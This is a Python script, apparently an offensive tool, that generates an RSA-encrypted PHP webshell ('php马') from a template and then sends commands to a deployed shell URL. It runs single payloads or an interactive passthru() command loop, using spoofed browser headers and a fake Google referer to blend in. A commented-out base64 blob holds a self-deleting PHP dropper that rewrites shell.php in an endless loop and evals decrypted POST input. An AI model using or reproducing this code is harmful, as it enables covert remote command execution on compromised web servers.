#!/usr/bin/env python3
# coding:utf-8
'''
@Author: yumu
@Date:   2019-07-17
@Email:   yumusb@foxmail.com
@Last Modified by:   yumu
@Last Modified time: 2019-07-17
@Description: RSA SHELL 测试
生成公钥 私钥、
openssl genrsa -out privkey.pem 2048
openssl rsa -in privkey.pem -out publickey.pem -pubout
'''
import os
import base64
import M2Crypto
# 安装M2库报错的话 请先apt/yum安装swig
import requests
import sys


def creatkey():
    return os.system('openssl genrsa -out privkey.pem 2048\nopenssl rsa -in privkey.pem -out publickey.pem -pubout\n')


def createphpshell(pwd, pubkey):
    #shelltxt = base64.b64decode("PD9waHAKc2V0X3RpbWVfbGltaXQoMCk7Cmlnbm9yZV91c2VyX2Fib3J0KDEpOwp1bmxpbmsoX19GSUxFX18pOwokc2hlbGwgPSAnPD9waHAKY2xhc3MgUnNhIHsKICAgIHByaXZhdGUgc3RhdGljICRQVUJMSUNfS0VZPSAiTXlQdWJLZXkiOwogICAgcHJpdmF0ZSBzdGF0aWMgZnVuY3Rpb24gZ2V0UHVibGljS2V5KCkKICAgIHsKICAgICAgICAkcHVibGljS2V5ID0gc2VsZjo6JFBVQkxJQ19LRVk7CiAgICAgICAgcmV0dXJuIG9wZW5zc2xfcGtleV9nZXRfcHVibGljKCRwdWJsaWNLZXkpOwogICAgfQoKICAgIHB1YmxpYyBzdGF0aWMgZnVuY3Rpb24gcHVibGljRGVjcnlwdCgkZW5jcnlwdGVkID0gIiIpCiAgICB7CiAgICAgICAgaWYgKCFpc19zdHJpbmcoJGVuY3J5cHRlZCkpIHsKICAgICAgICAgICAgcmV0dXJuIG51bGw7CiAgICAgICAgfQogICAgICAgIHJldHVybiAob3BlbnNzbF9wdWJsaWNfZGVjcnlwdChiYXNlNjRfZGVjb2RlKCRlbmNyeXB0ZWQpLCAkZGVjcnlwdGVkLCBzZWxmOjpnZXRQdWJsaWNLZXkoKSkpID8gJGRlY3J5cHRlZCA6IG51bGw7CiAgICB9Cn0KJGNtZD0kX1BPU1RbXCdNeVBhc3NcJ107CiRyc2EgPSBuZXcgUnNhKCk7CiRwdWJsaWNEZWNyeXB0ID0gJHJzYS0+cHVibGljRGVjcnlwdCgkY21kKTsKJHJlcz1ldmFsKCRwdWJsaWNEZWNyeXB0KTsnOwp3aGlsZSAoMSkgewogICAgZmlsZV9wdXRfY29udGVudHMoJ3NoZWxsLnBocCcsICRzaGVsbCk7CiAgICBzeXN0ZW0oJ2NobW9kIDc3NyBzaGVsbC5waHAnKTsKfQo=").decode()
    with open("demo.php","rb")as f:
        shelltxt=f.read().decode()
        shelltxt = shelltxt.replace("MyPass", pwd).replace(
            'MyPubKey', pubkey.decode())
        with open("shell.php", "w") as f1:
            f1.write(shelltxt)
        print(f"[+]php马存放在shell.php,链接密码{pwd}")


def pri_encrypt(msg, file_name):
    rsa_pri = M2Crypto.RSA.load_key(file_name)
    ctxt_pri = rsa_pri.private_encrypt(
        msg.encode(), M2Crypto.RSA.pkcs1_padding)
    ctxt64_pri = base64.b64encode(ctxt_pri)
    return ctxt64_pri


def main():
    if(len(sys.argv) == 1):
        print(
            f"use:\n1.python3 {sys.argv[0]} create yourpwd(指定密码生成shell)\n2.python3 {sys.argv[0]} con shellurl yourpwd payload(指定SHELL地址 密码 执行payload)\n3.python3 {sys.argv[0]} con shellurl yourpwd(指定SHELL地址 密码 直接交互)")
        exit()
    else:
        if(sys.argv[1] == 'create' and len(sys.argv) == 3):
            if(sys.argv[1] == 'create'):
                if(os.path.exists("publickey.pem") == False or os.path.exists("privkey.pem") == False):
                    print("[+]正在生成公私钥对...")
                    if(creatkey() == 0):
                        print("[+]生成成功")
                    else:
                        print("[-]失败，请检查权限问题。。")
                else:
                    print("[+]本地已经存在公私钥对,可以生成马了")
                pubkey_file = './publickey.pem'
                with open(pubkey_file, 'rb') as f:
                    pubkey = f.read()
                pwd = sys.argv[2]  # SHELL的连接密码
                createphpshell(pwd, pubkey)  # 生成php马子
        elif(sys.argv[1] == "con" and len(sys.argv) == 5):
            url = sys.argv[2]
            pwd = sys.argv[3]
            payload = sys.argv[4]
            prikey_file = './privkey.pem'
            encryptshell = pri_encrypt(payload, prikey_file)
            print(encryptshell)
            data = {
                pwd: encryptshell
            }
            headers = {
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
                "Accept-Encoding": "gzip, deflate, br",
                "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7",
                "Connection": "keep-alive",
                "Referer": "https://www.google.com.hk/",
                "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36",
            }
            try:
                print(requests.post(url, data=data, headers=headers).text)
            except:
                print(requests.post(url, data=data, headers=headers).status_code)
        elif(sys.argv[1] == "con" and len(sys.argv) == 4):
            url = sys.argv[2]
            pwd = sys.argv[3]
            prikey_file = './privkey.pem'
            payload = "passthru('date');"
            while(True):
                encryptshell = pri_encrypt(payload, prikey_file)
                data = {
                    pwd: encryptshell
                }
                headers = {
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
                    "Accept-Encoding": "gzip, deflate, br",
                    "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7",
                    "Connection": "keep-alive",
                    "Referer": "https://www.google.com.hk/",
                    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36",
                }
                print(requests.post(url, data=data, headers=headers).text.strip())
                payload = input(">")
                payload = f"passthru('{payload}');"
        else:
            print(f"use:\n1.python3 {sys.argv[0]} create yourpwd(指定密码生成shell)\n2.python3 {sys.argv[0]} con shellurl yourpwd payload(指定SHELL地址 密码 执行payload)\n3.python3 {sys.argv[0]} con shellurl yourpwd(指定SHELL地址 密码 直接交互)")
            exit()

if __name__ == "__main__":
	if (sys.version_info.major!=3):
		exit("请使用python3.6或者以上版本")
	if (sys.version_info.minor<6):
		exit("请使用python3.6或者以上版本")
	main()